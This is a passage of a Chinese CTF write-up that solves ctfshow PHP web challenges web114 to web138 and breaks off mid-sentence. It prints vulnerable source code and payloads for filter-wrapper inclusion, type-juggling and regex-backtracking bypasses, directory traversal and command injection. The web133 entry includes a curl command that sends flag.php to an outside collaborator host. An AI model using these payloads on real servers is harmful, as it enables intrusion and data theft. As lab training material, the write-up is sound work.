<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">filter</span>(<span class="params"><span class="variable">$file</span></span>)</span>&#123;</span><br><span class="line">    <span class="keyword">if</span>(<span class="title function_ invoke__">preg_match</span>(<span class="string">&#x27;/compress|root|zip|convert|\.\.\/|http|https|data|data|rot13|base64|string/i&#x27;</span>,<span class="variable">$file</span>))&#123;</span><br><span class="line">        <span class="keyword">die</span>(<span class="string">&#x27;hacker!&#x27;</span>);</span><br><span class="line">    &#125;<span class="keyword">else</span>&#123;</span><br><span class="line">        <span class="keyword">return</span> <span class="variable">$file</span>;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br></pre></td></tr></table></figure>

<p>所以题解和web112一样</p>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line">?file=php:<span class="comment">//filter/resource=flag.php</span></span><br><span class="line"></span><br></pre></td></tr></table></figure>

<h1 id="web115"><a href="#web115" class="headerlink" title="web115"></a>web115</h1><figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"></span><br><span class="line"><span class="comment">/*</span></span><br><span class="line"><span class="comment"># -*- coding: utf-8 -*-</span></span><br><span class="line"><span class="comment"># <span class="doctag">@Author</span>: Firebasky</span></span><br><span class="line"><span class="comment"># <span class="doctag">@Date</span>:   2020-09-16 11:25:09</span></span><br><span class="line"><span class="comment"># <span class="doctag">@Last</span> Modified by:   h1xa</span></span><br><span class="line"><span class="comment"># <span class="doctag">@Last</span> Modified time: 2020-10-01 15:08:19</span></span><br><span class="line"><span class="comment"></span></span><br><span class="line"><span class="comment">*/</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">include</span>(<span class="string">&#x27;flag.php&#x27;</span>);</span><br><span class="line"><span class="title function_ invoke__">highlight_file</span>(<span class="keyword">__FILE__</span>);</span><br><span class="line"><span class="title function_ invoke__">error_reporting</span>(<span class="number">0</span>);</span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">filter</span>(<span class="params"><span class="variable">$num</span></span>)</span>&#123;</span><br><span class="line">    <span class="variable">$num</span>=<span class="title function_ invoke__">str_replace</span>(<span class="string">&quot;0x&quot;</span>,<span class="string">&quot;1&quot;</span>,<span class="variable">$num</span>);</span><br><span class="line">    <span class="variable">$num</span>=<span class="title function_ invoke__">str_replace</span>(<span class="string">&quot;0&quot;</span>,<span class="string">&quot;1&quot;</span>,<span class="variable">$num</span>);</span><br><span class="line">    <span class="variable">$num</span>=<span class="title function_ invoke__">str_replace</span>(<span class="string">&quot;.&quot;</span>,<span class="string">&quot;1&quot;</span>,<span class="variable">$num</span>);</span><br><span class="line">    <span class="variable">$num</span>=<span class="title function_ invoke__">str_replace</span>(<span class="string">&quot;e&quot;</span>,<span class="string">&quot;1&quot;</span>,<span class="variable">$num</span>);</span><br><span class="line">    <span class="variable">$num</span>=<span class="title function_ invoke__">str_replace</span>(<span class="string">&quot;+&quot;</span>,<span class="string">&quot;1&quot;</span>,<span class="variable">$num</span>);</span><br><span class="line">    <span class="keyword">return</span> <span class="variable">$num</span>;</span><br><span class="line">&#125;</span><br><span class="line"><span class="variable">$num</span>=<span class="variable">$_GET</span>[<span class="string">&#x27;num&#x27;</span>];</span><br><span class="line"><span class="keyword">if</span>(<span class="title function_ invoke__">is_numeric</span>(<span class="variable">$num</span>) <span class="keyword">and</span> <span class="variable">$num</span>!==<span class="string">&#x27;36&#x27;</span> <span class="keyword">and</span> <span class="title function_ invoke__">trim</span>(<span class="variable">$num</span>)!==<span class="string">&#x27;36&#x27;</span> <span class="keyword">and</span> <span class="title function_ invoke__">filter</span>(<span class="variable">$num</span>)==<span class="string">&#x27;36&#x27;</span>)&#123;</span><br><span class="line">    <span class="keyword">if</span>(<span class="variable">$num</span>==<span class="string">&#x27;36&#x27;</span>)&#123;</span><br><span class="line">        <span class="keyword">echo</span> <span class="variable">$flag</span>;</span><br><span class="line">    &#125;<span class="keyword">else</span>&#123;</span><br><span class="line">        <span class="keyword">echo</span> <span class="string">&quot;hacker!!&quot;</span>;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;<span class="keyword">else</span>&#123;</span><br><span class="line">    <span class="keyword">echo</span> <span class="string">&quot;hacker!!!&quot;</span>;</span><br><span class="line">&#125; hacker!!!</span><br><span class="line"></span><br></pre></td></tr></table></figure>

<h3 id="trim函数"><a href="#trim函数" class="headerlink" title="trim函数"></a>trim函数</h3><p>语法 <code>trim(string,charlist)</code>参数</p>
<blockquote>
<p>string —必需。规定要检查的字符串。<br>charlist—可选。规定从字符串中删除哪些字符。如果省略该参数，则移除下列所有字符：<br>“\0” - NULL<br>“\t” - 制表符<br>“\n” - 换行<br>“\x0B” - 垂直制表符<br>“\r” - 回车<br>“ “ - 空格</p>
</blockquote>
<p>trim+is_numeric的测试:</p>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="keyword">for</span> (<span class="variable">$i</span>=<span class="number">0</span>; <span class="variable">$i</span> &lt;=<span class="number">128</span> ; <span class="variable">$i</span>++) &#123; </span><br><span class="line">    <span class="variable">$x</span>=<span class="title function_ invoke__">chr</span>(<span class="variable">$i</span>).<span class="string">&#x27;1&#x27;</span>;</span><br><span class="line">   <span class="keyword">if</span>(<span class="title function_ invoke__">trim</span>(<span class="variable">$x</span>)!==<span class="string">&#x27;1&#x27;</span> &amp;&amp;  <span class="title function_ invoke__">is_numeric</span>(<span class="variable">$x</span>))&#123;</span><br><span class="line">        <span class="keyword">echo</span> <span class="title function_ invoke__">urlencode</span>(<span class="title function_ invoke__">chr</span>(<span class="variable">$i</span>)).<span class="string">&quot;\n&quot;</span>;</span><br><span class="line">   &#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="meta">?&gt;</span></span><br><span class="line"></span><br></pre></td></tr></table></figure>

<p>可利用的只剩<code>%0c</code>了<br>payload:</p>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line">num=%<span class="number">0</span>c36</span><br></pre></td></tr></table></figure>

<h1 id="web123"><a href="#web123" class="headerlink" title="web123"></a>web123</h1><figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"></span><br><span class="line"><span class="comment">/*</span></span><br><span class="line"><span class="comment"># -*- coding: utf-8 -*-</span></span><br><span class="line"><span class="comment"># <span class="doctag">@Author</span>: Firebasky</span></span><br><span class="line"><span class="comment"># <span class="doctag">@Date</span>:   2020-09-05 20:49:30</span></span><br><span class="line"><span class="comment"># <span class="doctag">@Last</span> Modified by:   h1xa</span></span><br><span class="line"><span class="comment"># <span class="doctag">@Last</span> Modified time: 2020-09-07 22:02:47</span></span><br><span class="line"><span class="comment"># <span class="doctag">@email</span>: h1xa<span class="doctag">@ctfer</span>.com</span></span><br><span class="line"><span class="comment"># <span class="doctag">@link</span>: https://ctfer.com</span></span><br><span class="line"><span class="comment"></span></span><br><span class="line"><span class="comment">*/</span></span><br><span class="line"><span class="title function_ invoke__">error_reporting</span>(<span class="number">0</span>);</span><br><span class="line"><span class="title function_ invoke__">highlight_file</span>(<span class="keyword">__FILE__</span>);</span><br><span class="line"><span class="keyword">include</span>(<span class="string">&quot;flag.php&quot;</span>);</span><br><span class="line"><span class="variable">$a</span>=<span class="variable">$_SERVER</span>[<span class="string">&#x27;argv&#x27;</span>];</span><br><span class="line"><span class="variable">$c</span>=<span class="variable">$_POST</span>[<span class="string">&#x27;fun&#x27;</span>];</span><br><span class="line"><span class="keyword">if</span>(<span class="keyword">isset</span>(<span class="variable">$_POST</span>[<span class="string">&#x27;CTF_SHOW&#x27;</span>])&amp;&amp;<span class="keyword">isset</span>(<span class="variable">$_POST</span>[<span class="string">&#x27;CTF_SHOW.COM&#x27;</span>])&amp;&amp;!<span class="keyword">isset</span>(<span class="variable">$_GET</span>[<span class="string">&#x27;fl0g&#x27;</span>]))&#123;</span><br><span class="line">    <span class="keyword">if</span>(!<span class="title function_ invoke__">preg_match</span>(<span class="string">&quot;/\\\\|\/|\~|\`|\!|\@|\#|\%|\^|\*|\-|\+|\=|\&#123;|\&#125;|\&quot;|\&#x27;|\,|\.|\;|\?/&quot;</span>, <span class="variable">$c</span>)&amp;&amp;<span class="variable">$c</span>&lt;=<span class="number">18</span>)&#123;</span><br><span class="line">         <span class="keyword">eval</span>(<span class="string">&quot;<span class="subst">$c</span>&quot;</span>.<span class="string">&quot;;&quot;</span>);  </span><br><span class="line">         <span class="keyword">if</span>(<span class="variable">$fl0g</span>===<span class="string">&quot;flag_give_me&quot;</span>)&#123;</span><br><span class="line">             <span class="keyword">echo</span> <span class="variable">$flag</span>;</span><br><span class="line">         &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="meta">?&gt;</span></span><br><span class="line"></span><br></pre></td></tr></table></figure>

<p>一个难点是这里</p>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="keyword">if</span>(<span class="keyword">isset</span>(<span class="variable">$_POST</span>[<span class="string">&#x27;CTF_SHOW&#x27;</span>])&amp;&amp;<span class="keyword">isset</span>(<span class="variable">$_POST</span>[<span class="string">&#x27;CTF_SHOW.COM&#x27;</span>])&amp;&amp;!<span class="keyword">isset</span>(<span class="variable">$_GET</span>[<span class="string">&#x27;fl0g&#x27;</span>]))</span><br><span class="line"></span><br></pre></td></tr></table></figure>

<p>PHP变量名由数字字母下划线组成，是没有.的<br>这里从大佬的文章了解到，GET或POST方式传进去的变量名,会自动将空格 + . [转换为_。<br>有一种特殊情况，特殊字符[GET或POST方式传参时,变量名中的[也会被替换为_,但其后的字符就不会被替换了<br>如 CTF[SHOW.COM&#x3D;&gt;CTF_SHOW.COM<br><strong>payload</strong></p>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line">POST: CTF_SHOW=&amp;CTF[SHOW.COM=&amp;fun=<span class="keyword">echo</span> <span class="variable">$flag</span></span><br><span class="line"></span><br></pre></td></tr></table></figure>

<p>很明显这个解是非预期的，也不是通过正常步骤得到flag的<br>出题人的<strong>预期解</strong></p>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line">get: a=<span class="number">1</span>+fl0g=flag_give_me</span><br><span class="line">post: CTF_SHOW=&amp;CTF[SHOW.COM=&amp;fun=<span class="title function_ invoke__">parse_str</span>(<span class="variable">$a</span>[<span class="number">1</span>])</span><br><span class="line"></span><br></pre></td></tr></table></figure>

<h1 id="web125"><a href="#web125" class="headerlink" title="web125"></a>web125</h1><p>payload</p>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line">GET:?<span class="number">1</span>=flag.php </span><br><span class="line">POST:CTF_SHOW=&amp;CTF[SHOW.COM=&amp;fun=<span class="title function_ invoke__">highlight_file</span>(<span class="variable">$_GET</span>[<span class="number">1</span>])</span><br><span class="line"></span><br></pre></td></tr></table></figure>

<h2 id="web126"><a href="#web126" class="headerlink" title="web126"></a>web126</h2><p>这题的姿势同web124的预期解，即</p>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line">get: a=<span class="number">1</span>+fl0g=flag_give_me</span><br><span class="line">post: CTF_SHOW=&amp;CTF[SHOW.COM=&amp;fun=<span class="title function_ invoke__">parse_str</span>(<span class="variable">$a</span>[<span class="number">1</span>])</span><br><span class="line"></span><br></pre></td></tr></table></figure>

<h1 id="web127"><a href="#web127" class="headerlink" title="web127"></a>web127</h1><figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"></span><br><span class="line"><span class="title function_ invoke__">error_reporting</span>(<span class="number">0</span>);</span><br><span class="line"><span class="keyword">include</span>(<span class="string">&quot;flag.php&quot;</span>);</span><br><span class="line"><span class="title function_ invoke__">highlight_file</span>(<span class="keyword">__FILE__</span>);</span><br><span class="line"><span class="variable">$ctf_show</span> = <span class="title function_ invoke__">md5</span>(<span class="variable">$flag</span>);</span><br><span class="line"><span class="variable">$url</span> = <span class="variable">$_SERVER</span>[<span class="string">&#x27;QUERY_STRING&#x27;</span>];</span><br><span class="line"></span><br><span class="line"><span class="comment">//特殊字符检测</span></span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">waf</span>(<span class="params"><span class="variable">$url</span></span>)</span>&#123;</span><br><span class="line">    <span class="keyword">if</span>(<span class="title function_ invoke__">preg_match</span>(<span class="string">&#x27;/\`|\~|\!|\@|\#|\^|\*|\(|\)|\\$|\_|\-|\+|\&#123;|\;|\:|\[|\]|\&#125;|\&#x27;|\&quot;|\&lt;|\,|\&gt;|\.|\\\|\//&#x27;</span>, <span class="variable">$url</span>))&#123;</span><br><span class="line">        <span class="keyword">return</span> <span class="literal">true</span>;</span><br><span class="line">    &#125;<span class="keyword">else</span>&#123;</span><br><span class="line">        <span class="keyword">return</span> <span class="literal">false</span>;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span>(<span class="title function_ invoke__">waf</span>(<span class="variable">$url</span>))&#123;</span><br><span class="line">    <span class="keyword">die</span>(<span class="string">&quot;嗯哼？&quot;</span>);</span><br><span class="line">&#125;<span class="keyword">else</span>&#123;</span><br><span class="line">    <span class="title function_ invoke__">extract</span>(<span class="variable">$_GET</span>);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span>(<span class="variable">$ctf_show</span>===<span class="string">&#x27;ilove36d&#x27;</span>)&#123;</span><br><span class="line">    <span class="keyword">echo</span> <span class="variable">$flag</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br></pre></td></tr></table></figure>

<p>过滤了<code>_</code>，绕过方式还是同web123<br>payload:</p>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line">?ctf show=ilove36d</span><br><span class="line"></span><br></pre></td></tr></table></figure>

<h1 id="web128"><a href="#web128" class="headerlink" title="web128"></a>web128</h1><figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"></span><br><span class="line"><span class="title function_ invoke__">error_reporting</span>(<span class="number">0</span>);</span><br><span class="line"><span class="keyword">include</span>(<span class="string">&quot;flag.php&quot;</span>);</span><br><span class="line"><span class="title function_ invoke__">highlight_file</span>(<span class="keyword">__FILE__</span>);</span><br><span class="line"></span><br><span class="line"><span class="variable">$f1</span> = <span class="variable">$_GET</span>[<span class="string">&#x27;f1&#x27;</span>];</span><br><span class="line"><span class="variable">$f2</span> = <span class="variable">$_GET</span>[<span class="string">&#x27;f2&#x27;</span>];</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span>(<span class="title function_ invoke__">check</span>(<span class="variable">$f1</span>))&#123;</span><br><span class="line">    <span class="title function_ invoke__">var_dump</span>(<span class="title function_ invoke__">call_user_func</span>(<span class="title function_ invoke__">call_user_func</span>(<span class="variable">$f1</span>,<span class="variable">$f2</span>)));</span><br><span class="line">&#125;<span class="keyword">else</span>&#123;</span><br><span class="line">    <span class="keyword">echo</span> <span class="string">&quot;嗯哼？&quot;</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">check</span>(<span class="params"><span class="variable">$str</span></span>)</span>&#123;</span><br><span class="line">    <span class="keyword">return</span> !<span class="title function_ invoke__">preg_match</span>(<span class="string">&#x27;/[0-9]|[a-z]/i&#x27;</span>, <span class="variable">$str</span>);</span><br><span class="line">&#125; </span><br><span class="line"></span><br></pre></td></tr></table></figure>

<h3 id="gettext-拓展的应用"><a href="#gettext-拓展的应用" class="headerlink" title="gettext()拓展的应用"></a>gettext()拓展的应用</h3><p>很骚的一个操作，参考文章:</p>
<blockquote>
<p><a href="https://www.cnblogs.com/lost-1987/articles/3309693.html">关于php中gettext的用法？</a></p>
</blockquote>
<blockquote>
<p><a href="https://www.php.net/manual/zh/book.gettext.php">Gettext</a></p>
</blockquote>
<p>在开启该拓展后 _() 等效于 gettext(),如</p>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="keyword">echo</span> <span class="title function_ invoke__">gettext</span>(<span class="string">&quot;phpinfo&quot;</span>);</span><br><span class="line">结果  phpinfo</span><br><span class="line"></span><br><span class="line"><span class="keyword">echo</span> <span class="title function_ invoke__">_</span>(<span class="string">&quot;phpinfo&quot;</span>);</span><br><span class="line">结果 phpinfo</span><br><span class="line"></span><br></pre></td></tr></table></figure>

<h2 id="call-user-func-函数-1"><a href="#call-user-func-函数-1" class="headerlink" title="call_user_func()函数"></a>call_user_func()函数</h2><figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="title function_ invoke__">call_user_func</span> ( <span class="keyword">callable</span> <span class="variable">$callback</span> [, <span class="keyword">mixed</span> <span class="variable">$parameter</span> [, <span class="keyword">mixed</span> $... ]] )</span><br><span class="line"></span><br></pre></td></tr></table></figure>

<p><strong>解释:</strong></p>
<blockquote>
<p>第一个参数 callback 是被调用的回调函数，其余参数是回调函数的参数。</p>
</blockquote>
<p>所以<code>call_user_func(&#39;_&#39;,&#39;phpinfo&#39;)</code>相当于<code>gettext(&quot;phpinfo&quot;)</code><br>这题可以利用get_defined_vars</p>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="title function_ invoke__">get_defined_vars</span>() 函数返回由所有已定义变量所组成的数组。</span><br><span class="line"></span><br></pre></td></tr></table></figure>

<p>这题可以利用get_defined_vars</p>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="title function_ invoke__">get_defined_vars</span>() 函数返回由所有已定义变量所组成的数组。</span><br><span class="line"></span><br></pre></td></tr></table></figure>

<p>payload:</p>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line">?f1=_&amp;f2=get_defined_vars</span><br></pre></td></tr></table></figure>

<h1 id="web129"><a href="#web129" class="headerlink" title="web129"></a>web129</h1><p>目录穿越<br>payload</p>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line">?f=/ctfshow/../../../../<span class="keyword">var</span>/www/html/flag.php</span><br></pre></td></tr></table></figure>

<h1 id="web130"><a href="#web130" class="headerlink" title="web130"></a>web130</h1><figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"></span><br><span class="line"><span class="title function_ invoke__">error_reporting</span>(<span class="number">0</span>);</span><br><span class="line"><span class="title function_ invoke__">highlight_file</span>(<span class="keyword">__FILE__</span>);</span><br><span class="line"><span class="keyword">include</span>(<span class="string">&quot;flag.php&quot;</span>);</span><br><span class="line"><span class="keyword">if</span>(<span class="keyword">isset</span>(<span class="variable">$_POST</span>[<span class="string">&#x27;f&#x27;</span>]))&#123;</span><br><span class="line">    <span class="variable">$f</span> = <span class="variable">$_POST</span>[<span class="string">&#x27;f&#x27;</span>];</span><br><span class="line"></span><br><span class="line">    <span class="keyword">if</span>(<span class="title function_ invoke__">preg_match</span>(<span class="string">&#x27;/.+?ctfshow/is&#x27;</span>, <span class="variable">$f</span>))&#123;</span><br><span class="line">        <span class="keyword">die</span>(<span class="string">&#x27;bye!&#x27;</span>);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">if</span>(<span class="title function_ invoke__">stripos</span>(<span class="variable">$f</span>, <span class="string">&#x27;ctfshow&#x27;</span>) === <span class="literal">FALSE</span>)&#123;</span><br><span class="line">        <span class="keyword">die</span>(<span class="string">&#x27;bye!!&#x27;</span>);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">echo</span> <span class="variable">$flag</span>;</span><br><span class="line"></span><br><span class="line">&#125;</span><br><span class="line"></span><br></pre></td></tr></table></figure>

<p>这个题也挺骚的，有很多种解法，首先是利用正则最大回溯次数绕过<br>正则最大回溯次数绕过<br>回溯现象：</p>
<blockquote>
<p>PHP中，为了防止一次正则匹配调用的匹配过程过大从而造成过多的资源消耗，限定了一次正则匹配中调用匹配函数的次数。 回溯主要有两种<br>1、贪婪模式下，pattern部分被匹配，但是后半部分没匹配（匹配“用力过猛”，把后面的部分也匹配过了）时匹配式回退的操作，在出现<em>、+时容易产生。<br>2、非贪婪模式下，字符串部分被匹配，但后半部分没匹配完全（匹配“用力不够”，需要通配符再匹配一定的长度），在出现</em>?、+?时容易产生。</p>
</blockquote>
<p>当传入字符串在正则匹配时回溯次数超过限制（默认1000000，可调整）时，会报错返回false<br>关于这种方法，题目中也给出了提示<br>very very very（省略25万个very）ctfshow<br>payload(py脚本):</p>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line">import requests</span><br><span class="line">url=<span class="string">&quot;http://07b28eb7-15d4-4250-be72-33a58b73dba1.chall.ctf.show/&quot;</span></span><br><span class="line">data=&#123;</span><br><span class="line">  <span class="string">&#x27;f&#x27;</span>:<span class="string">&#x27;very&#x27;</span>*<span class="number">250000</span>+<span class="string">&#x27;ctfshow&#x27;</span></span><br><span class="line">&#125;</span><br><span class="line">r=requests.<span class="title function_ invoke__">post</span>(url,data=data)</span><br><span class="line"><span class="keyword">print</span>(r.text)</span><br><span class="line"></span><br></pre></td></tr></table></figure>

<p>执行后，因为超出了<code>preg_match</code>的回溯次数，报错返回false，达到绕过的效果，同时因为POST传入的<code>f</code>中有<code>ctfshow</code>，第二个判断也被绕过，输出flag<br>还有两个比较强的姿势…首先是hint中给出的<code>f=ctfshow</code>，因为在第一个正则匹配中</p>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="keyword">if</span>(<span class="title function_ invoke__">preg_match</span>(<span class="string">&#x27;/.+?ctfshow/is&#x27;</span>, <span class="variable">$f</span>))&#123;</span><br><span class="line">        <span class="keyword">die</span>(<span class="string">&#x27;bye!&#x27;</span>);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br></pre></td></tr></table></figure>

<p><code>.</code>表示<code>任意单个字符</code>，<code>+</code>表示<code>必须匹配1次或多次</code>，<code>+?</code>表示 <code>重复1次或更多次，但尽可能少重复</code><br>所以在ctfshow前面必须有至少一个字符，才会返回True<br>还有一种姿势是<code>数组绕过</code>，传入数组时，stripos会返回<code>null</code>，<code>null!=false</code><br>payload:</p>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line">POST:f=ctfshow</span><br><span class="line">POST:f[]=a</span><br><span class="line"></span><br></pre></td></tr></table></figure>

<h1 id="web131"><a href="#web131" class="headerlink" title="web131"></a>web131</h1><p>考察<strong>正则最大回溯次数绕过</strong>，用上题的第一个姿势(记得把<code>ctfshow</code> 改成<code>36Dctfshow</code>)</p>
<h1 id="web132"><a href="#web132" class="headerlink" title="web132"></a>web132</h1><p>查看robots.txt发现提示,访问得到源码</p>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"> <span class="meta">&lt;?php</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">include</span>(<span class="string">&quot;flag.php&quot;</span>);</span><br><span class="line"><span class="title function_ invoke__">highlight_file</span>(<span class="keyword">__FILE__</span>);</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span>(<span class="keyword">isset</span>(<span class="variable">$_GET</span>[<span class="string">&#x27;username&#x27;</span>]) &amp;&amp; <span class="keyword">isset</span>(<span class="variable">$_GET</span>[<span class="string">&#x27;password&#x27;</span>]) &amp;&amp; <span class="keyword">isset</span>(<span class="variable">$_GET</span>[<span class="string">&#x27;code&#x27;</span>]))&#123;</span><br><span class="line">    <span class="variable">$username</span> = (String)<span class="variable">$_GET</span>[<span class="string">&#x27;username&#x27;</span>];</span><br><span class="line">    <span class="variable">$password</span> = (String)<span class="variable">$_GET</span>[<span class="string">&#x27;password&#x27;</span>];</span><br><span class="line">    <span class="variable">$code</span> = (String)<span class="variable">$_GET</span>[<span class="string">&#x27;code&#x27;</span>];</span><br><span class="line"></span><br><span class="line">    <span class="keyword">if</span>(<span class="variable">$code</span> === <span class="title function_ invoke__">mt_rand</span>(<span class="number">1</span>,<span class="number">0x36D</span>) &amp;&amp; <span class="variable">$password</span> === <span class="variable">$flag</span> || <span class="variable">$username</span> ===<span class="string">&quot;admin&quot;</span>)&#123;</span><br><span class="line">        </span><br><span class="line">        <span class="keyword">if</span>(<span class="variable">$code</span> == <span class="string">&#x27;admin&#x27;</span>)&#123;</span><br><span class="line">            <span class="keyword">echo</span> <span class="variable">$flag</span>;</span><br><span class="line">        &#125;</span><br><span class="line">        </span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br></pre></td></tr></table></figure>

<p>mt_rand()<br>用于生成随机数<br>注意这个判断式<br>if($code &#x3D;&#x3D;&#x3D; mt_rand(1,0x36D) &amp;&amp; $password &#x3D;&#x3D;&#x3D; $flag || $username &#x3D;&#x3D;&#x3D;”admin”)<br>这里三个都是强等于，不像弱等于一样好绕过，而且前两个条件可以说是不可能同时达成的,这里是利用了比较符的优先级<br>所以即使前两个条件不满足，只要第三个条件username&#x3D;&#x3D;&#x3D;”admin”满足即可,同时令code&#x3D;admin即可输出flag</p>
<p>payload:</p>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line">?username=admin&amp;code=admin&amp;password=<span class="number">1</span></span><br></pre></td></tr></table></figure>

<h1 id="web133"><a href="#web133" class="headerlink" title="web133"></a>web133</h1><figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"></span><br><span class="line"><span class="title function_ invoke__">error_reporting</span>(<span class="number">0</span>);</span><br><span class="line"><span class="title function_ invoke__">highlight_file</span>(<span class="keyword">__FILE__</span>);</span><br><span class="line"><span class="comment">//flag.php</span></span><br><span class="line"><span class="keyword">if</span>(<span class="variable">$F</span> = @<span class="variable">$_GET</span>[<span class="string">&#x27;F&#x27;</span>])&#123;</span><br><span class="line">    <span class="keyword">if</span>(!<span class="title function_ invoke__">preg_match</span>(<span class="string">&#x27;/system|nc|wget|exec|passthru|netcat/i&#x27;</span>, <span class="variable">$F</span>))&#123;</span><br><span class="line">        <span class="keyword">eval</span>(<span class="title function_ invoke__">substr</span>(<span class="variable">$F</span>,<span class="number">0</span>,<span class="number">6</span>));</span><br><span class="line">    &#125;<span class="keyword">else</span>&#123;</span><br><span class="line">        <span class="keyword">die</span>(<span class="string">&quot;6个字母都还不够呀?!&quot;</span>);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br></pre></td></tr></table></figure>

<p>限制执行前6个字符，这题参考<a href="https://blog.csdn.net/qq_46091464/article/details/109095382">Firebasky师傅的wp</a>，又是新姿势，具体的原理看师傅的博客。<br>先打开burp，获得一个域名</p>
<p><img src="https://gallery-1304405887.cos.ap-nanjing.myqcloud.com/markdownimage_1.png"></p>
<p>payload：</p>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="comment"># payload </span></span><br><span class="line"><span class="comment">#其中-F 为带文件的形式发送post请求</span></span><br><span class="line"><span class="comment">#xx是上传文件的name值，flag.php就是上传的文件 </span></span><br><span class="line">?F=`<span class="variable">$F</span>`;+curl -X POST -F xx=@flag.php  http:<span class="comment">//8clb1g723ior2vyd7sbyvcx6vx1ppe.burpcollaborator.net</span></span><br></pre></td></tr></table></figure>


<p>我们传递?F&#x3D;<code>$F</code>;+sleep 3好像网站确实sleep了一会说明的确执行了命令<br><strong>那为什么会这样？</strong><br>因为是我们传递的<code>$F</code>;+sleep 3。先进行substr()函数截断然后去执行eval()函数<br>这个函数的作用是执行php代码，<code>是shell_exec()函数的缩写，然后就去命令执行。 而$F就是我们输入的</code>$F<code>;+sleep 3 使用最后执行的代码应该是 </code>$F<code>;+sleep 3</code>,就执行成功<br>这里可能有点绕，慢慢理解</p>
<h1 id="web134"><a href="#web134" class="headerlink" title="web134"></a>web134</h1><figure class="highlight php"><table><tr><td class="code"><pre><span class="line">?_POST[key1]=<span class="number">36</span>d&amp;_POST[key2]=<span class="number">36</span>d</span><br></pre></td></tr></table></figure>


<h1 id="web135"><a href="#web135" class="headerlink" title="web135"></a>web135</h1><p>在133的基础上增加了curl和其他一些字符的过滤，这时候其实可以通过ping得到flag的</p>
<p>payload</p>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line">F=`<span class="variable">$F</span> `;nl f*&gt;xxx</span><br></pre></td></tr></table></figure>


<p>访问url&#x2F;xxx即可得到flag</p>
<h1 id="web136"><a href="#web136" class="headerlink" title="web136"></a>web136</h1><p>其实是再135的基础上增加了过滤<code>&gt;&lt; </code><br>但是linux中还可以用tee写文件</p>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line">ls|tee xxx</span><br><span class="line"></span><br></pre></td></tr></table></figure>


<p>我们先来看下当前目录下有啥文件，访问url&#x2F;xxx发现只有一个index.php<br>那我们再去看看根目录下有什么文件</p>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line">ls /|tee xxx</span><br></pre></td></tr></table></figure>


<p>得到 f149_15_h3r3<br>最后直接打开就可以了</p>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line">nl  /f149_15_h3r3|tee xxx</span><br><span class="line"></span><br></pre></td></tr></table></figure>


<h1 id="web137"><a href="#web137" class="headerlink" title="web137"></a>web137</h1><p>没有难度的一道题，考察调用类中的函数</p>
<p>payload</p>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line">ctfshow=ctfshow::<span class="variable constant_">getflag</span></span><br></pre></td></tr></table></figure>


<p>PHP中的<code>::</code> 指静态方法</p>
<h1 id="web138"><a href="#web138" class="headerlink" title="web138"></a>web138</h1><p>在上一题的基础上过滤了冒号<br>这时候就考察我们对call_user_func函数的使用了，call_user_func中不但可以传字符串也可以传数组。<br>具体使用方法如下</p>
